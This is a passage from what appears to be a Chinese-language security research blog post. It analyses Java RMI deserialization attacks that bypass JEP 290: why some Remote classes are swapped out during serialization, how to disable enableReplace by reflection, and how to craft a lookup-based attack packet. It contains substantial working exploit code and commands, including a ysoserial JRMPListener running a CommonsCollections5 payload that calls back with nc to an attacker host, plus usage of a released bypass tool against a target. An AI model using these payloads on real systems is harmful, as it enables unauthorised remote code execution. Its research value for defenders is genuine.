     m.setAccessible(true);
     UnicastRemoteObject UnicastRemoteObject_obj =(UnicastRemoteObject)m.newInstance();
     //3.2.修改实例的ref参数（使用yso中的模块）
     Reflections.setFieldValue(UnicastRemoteObject_obj,"ref",ref);
可以对比下三个对象的内容，都包含了我们修改的ref对象，没问题。
但是在实际利用的时候， **使用UnicastRemoteObject是不可以的！**
一开始我也非常的疑惑：这不科学！，但是代码是死肥宅最忠实的伙伴，它是不会骗人的。
>
> [bsmali4师傅的一次攻击内网RMI服务的深思](http://www.codersec.net/2018/09/一次攻击内网rmi服务的深思/)这篇文章中发现了这个问题，但是他的结论是由于ref是一个transient类型的变量，不会反序列化。
>
> 但实际上可以攻击的RMIConnectionImpl_Stub类也是使用transient类型的ref。所以这个结论是错误的
其实关键点在于：
  * 我们默认理解为序列化过程是对于我们的恶意object进行writeobject，`RMIConnectionImpl_Stub.writeobject()`、`UnicastRemoteObject.writeobject()`那么当然是序列化的。（实际上也可以，在github的Bypass290代码中尝试序列化写入了文件中进行查看，结果也是把正确的ref值写入了，就不贴图了）
  * 但是实际上客户端序列化的过程为：ObjectOutput.writeobject(我们的恶意object)
那么实际上这边的序列化逻辑与我们想象的有点出入， **他会去替换掉我们辛辛苦苦生成的object**
。这是导致同是继承RemoteObject有的行，有的不行的关键。
我们在`java.io.ObjectOutputStream#writeObject0`打入断点，使用UnicastRemoteObject对象来攻击，细看：
    private void writeObject0(Object obj, boolean unshared)
            throws IOException
        {
            boolean oldMode = bout.setBlockDataMode(false);
            depth++;
            try {
                //一大堆类型检查，都不会通过
                // 想要去检查替换我们的object
                Object orig = obj;
                Class cl = obj.getClass();
                ObjectStreamClass desc;
                for (;;) {
                    //查找相关内容
                }
                if (enableReplace) {//都是true
                //!!!!!!!!!!!此处替换了我们的对象！！！！！！！！！！
                    Object rep = replaceObject(obj);
                    if (rep != obj && rep != null) {
                        cl = rep.getClass();
                        desc = ObjectStreamClass.lookup(cl, true);
                    }
                    obj = rep;
                }
                //一些替换后的处理，不太重要
                // 通过类进行分配序列化过程
                if (obj instanceof String) {
                    writeString((String) obj, unshared);
                } else if (cl.isArray()) {
                    writeArray(obj, desc, unshared);
                } else if (obj instanceof Enum) {
                    writeEnum((Enum) obj, desc, unshared);
                } else if (obj instanceof Serializable) {
                    //进入此处再开始正常的序列化
                    writeOrdinaryObject(obj, desc, unshared);
                //...省略...
        }
UnicastRemoteObject在此处的情况，发生了变化：
RMIConnectionImpl_Stub在此处的情况，没有发生变化：
replaceobject替换的方法具体在`sun.rmi.server.MarshalOutputStream#replaceObject`中
    //var1就是我们想要序列化的类
    protected final Object replaceObject(Object var1) throws IOException {
        //这个类要是Remote接口的，并且不是RemoteStub接口的，为true
        if (var1 instanceof Remote && !(var1 instanceof RemoteStub)) {
            //这里会去获取到新的对象来替换
            //UnicastRemoteObject走的就是这条路
            Target var2 = ObjectTable.getTarget((Remote)var1);
            if (var2 != null) {
                return var2.getStub();
            }
        }
        //RMIConnectionImpl_Stub走的就是这条路
        return var1;
    }
那么就很明显了，之前我们觉得只要是remote接口就行了，这个定义有问题，实际上要满足以下两个条件的类我们才能用：
  1. 是Remote接口
  2. 并且是RemoteStub接口
> 这里的逻辑关系需要倒一下，是Remote 又不是RemoteStub是不行的，又要是Remote的
那么我们就找到了为啥RMIConnectionImple_Stub可以，但是UnicastRemoteObject不行的原因。
找Remote的继承类就可以轻而易举找到跟RMIConnectionImple_Stub类似的其他类。
这些理论都是可以的，就不一一实验了。
###### 新的小问题-RemoteObjectInvocationHandler为啥又可以了
但是我们又会发现一开始就成功的RemoteObjectInvocationHandler并不满足我们的出来的规定，它是Remote接口但是不是RemoteStub接口呀。
继续调试
发现虽然它不满足条件进入了if，但是获取到的替换类var2为空，又返回原本的值了。
至于为什么会获取到的结果var2为空，是因为在getTarget中会去内部查询，因为InvocationHandler的特性所以类型转化不到原始类所以为空（胡说八道中，反正跟InvocationHandler脱不了干系）
至此我们就完全搞清楚了找一个带UnicastRef类型参数的实现Remote接口的类的时候需要：
  1. 这个类它可以填入一个UnicastRef对象（这表示我们的payload可以塞进去）
  2. 这个类要是Remote接口的并且是RemoteStub接口
  3. 这个类要是Remote接口并且不是RemoteStub接口要是获取不到原来的类也可以，比如RemoteInvocationHandler
###### 绕过序列化过程中的替换使所有类均可用于攻击
从[国外老哥的文章](https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/)中得到的思路。
在分析中我们发现 **ObjectOutputStream对象流** 中的 **enableReplace** 全局变量决定了我们的对象是否会被替换：
    public class ObjectOutputStream
        extends OutputStream implements ObjectOutput, ObjectStreamConstants
    {
        /** if true, invoke replaceObject() */
        private boolean enableReplace;
        private void writeObject0(Object obj, boolean unshared)
            throws IOException
        {
            ...
            if (enableReplace) {//都是true
                ...
            }
            ...
         }
那么其实我们只要用反射机制，在序列化前把out对象的 **enableReplace属性修改为false**
就可以了(这需要重新实现bind查询，来进行修改)。大概如下：
    java.io.ObjectOutput out = call.getOutputStream();
    //反射修改enableReplace
    ReflectionHelper.setFieldValue(out, "enableReplace", false);
    out.writeObject(obj); // 写入我们的对象
>
> 这些绕过我都已经在[ysomap](https://github.com/wh1t3p1g/ysomap)中完成了实现。（没错看到后面，你会发现一开始打算自己做的，然后发现ysomap已经完成了一部分，秉着打不过他就加入他的原则，开始为ysomap添砖加瓦）
##### 4.带UnicastRef类型参数的实现Remote接口的类—自定义
但是如果我们回忆之前的出的结论：
>
> 反序列化打服务端，可以使用一个服务端不存在的类。在这个服务端不存在的类的变量中放入payload，这个payload会在服务端反序列化这个不存在的类的时候触发，虽然会报错，但是会触发。
我们实际上之前做的所有的研究都是无用功，因为我们压根不用去找一个存在于JDK中的类去满足条件来进行攻击，而是自己写一个就可以了。
这个结论让我非常沮丧，我也希望有人告诉我不是这样的，但是实验结果就是如此，他就是可以攻击成功。我甚至打包了没有包含自定义的类的jar放到远程服务器上，但是仍然可以。
实现一个可以序列化的remote接口的类，然后正常攻击
    public static class lala_remote implements Remote, java.io.Serializable {
            private RemoteRef ref;
            public lala_remote(UnicastRef remoteref) throws Throwable {
                ref=remoteref;
            }
        }
> 可以注意到不是RemoteStub接口，自实现的类会满足上卖弄整理的第三种情况，不会被替换对象。
又是报错报着找不到class，但是弹框成功。
远程的（用8u111）。
也是非常有趣，大家都是用已经写好的poc、ysoserial，但实际上.......随便搞搞就可以用了。
> 此处为ysomap添加了一个自定义类的模块RMIConnectCustomized，来证明可行性。
#### bind的局限性
好的，重新整理心情。来讨论随便的bind的局限性。
当我们在本地进行试验的时候，使用高于8u141的版本也是可以命令执行的。这会形成一种不受版本限制的错觉。
但实际上在远程攻击的时候，这种攻击是有局限性的。
  1. 我们把github的代码打包一下，放到远程服务器上，运行靶机`java -cp RMIDeserialize.jar com.lala.ServerAndRegister`（服务器会有危险）
  2. 服务端再起一个JRMP-Listener。`java -cp ysoserial.jar ysoserial.exploit.JRMPListener 11 CommonsCollections5 "nc 47.102.137.xxx:10000"`（用nc来表示命令执行。ps.讲道理不应该在靶机上起一个攻击者的攻击用服务，但是我没有更多的服务器了...）
  3. `nc -lvvp 10000`服务器通过nc监听来判断命令执行是否成功
  4. 本地Bypass290代码改成远程攻击端口
  5. 运行Bypass290攻击
服务器8u131环境成功。
服务器8u161失败
回忆之前的说明，原因同样是bind操作中注册端对于服务端的地址验证。
那么根据之前的结论，我们可以通过lookup来替换bind操作来进行攻击，这样可以绕过bind操作中对于服务端得地址验证。
### 与RMI客户端反序列化攻击RMI服务端-Lookup结合
这边参照Barmie的bind攻击思路，使用拦截器来替换攻击包的字节码，来自己重构一个攻击包的字节码。这个思路非常底层和繁琐，但是理论上可以绕过所有客户端限制逻辑。
#### 基于Barmie拦截器的自实现
我把Barmie的拦截器逻辑拔了出来，放到了Github的RMI-Bypass290项目下。
在Barmie的原逻辑中，拦截器中字节码的拼接非常简单粗暴，他会保留一些包头固定格式，然后修改参数。通常都是直接复制成功的poc的16进制字节码，然后修改其中命令执行的16进制代码，再拼接进入数据包进行发送。比如CC的payload是这样：
    private final String _header_chunk = "737200116a6176612e757469....";//开头的序列化信息
    private final String _footer_chunk = "740004657865637571007e00....";//结尾的序列化信息
    //开头塞进去
    out.write(this.fixReferences(this.hexStrToByteArray(this._header_chunk), refCorrection));
    //自定义添加要执行的String形式的命令
    out.write(this.stringToUtf8ByteArray(cmd));
    //结尾塞进去
    out.write(this.fixReferences(this.hexStrToByteArray(this._footer_chunk), refCorrection));
我们的Remote接口的对象原本也可以按照这个思路，找一个成功的数据包，然后修改其中的JRMP服务器回连IP和端口就行了。
但是对比JRMP服务器地址：888.888.888.888:8887、888.888.888.888:8888两次攻击数据包发现：
JRMP服务器回连IP可以简单进行修改，但是端口却是不可以显性直接进行修改的。
那么就尝试自己去构造一个序列化对象（由于要与攻击成功数据包进行对比，我们就是用序列化结构更通用的RMIConnectionImpl_Stub类。因为使用自实现类，不同地方包名会不一样不方便）
写完代码后，发现直接序列化不能正常利用攻击，与攻击成功数据包对比发现需要修正000078->00007078。（这里应该是不同的输入流对象对于序列化的处理不同导致的）
重新微调，在`payloads.BypassJEP290_RMIConnectionImpl_Stub#getBytes`中进行类实现。
    //使用RMIConnectionImpl_Stub类
    RMIConnectionImpl_Stub RMIConnectionImpl_Stub_obj = new RMIConnectionImpl_Stub(ref);
    //序列化，同时修正000078->00007078
    byte[] serial_Primary=serialize(RMIConnectionImpl_Stub_obj);
    //除去aced开头（序列化开头）
    byte[] serial_byte= new byte[serial_Primary.length-4];
    System.arraycopy(serial_Primary, 4, serial_byte, 0, serial_byte.length);
    //填入传输流
    out.write(this.fixReferences(serial_byte));
完毕。打包成jar发布在github的release中了。
`java -jar RMI-Bypass290.jar 47.xx.xx.xx 1099 47.xx.xx.xx
1199`（前者攻击目标IP和端口，后者JRMP服务器IP和端口）直接测试服务端161版本。
#### 重实现lookup逻辑
虽然工具完成了，但是这么实现着实费劲，一开始以为压根没有人实现这个工具，最后发现wh1tp1g已经集成到他的[ysomap](https://github.com/wh1t3p1g/ysomap)中了（然后打不过他就加入了他=
=）.
而且实现的方法更为聪明，只是做了上层lookup函数的重写，这样子就实现起来就很简单简洁，且不用考虑底层字节的各种情况。
`ysomap.core.exploit.rmi.component.Naming#lookup`直接把原来的接口`lookup(String)`调成`lookup(Object)`（实现不是如此，逻辑是如此，数据包封装的逻辑实际上直接照搬过来就可以了）
    //多加了个registry参数，然后自己实现部分固定值的获取
    public static Remote lookup(Registry registry, Object obj)
                throws Exception {
            RemoteRef ref = (RemoteRef) ReflectionHelper.getFieldValue(registry, "ref");
            long interfaceHash = (long) ReflectionHelper.getFieldValue(registry, "interfaceHash");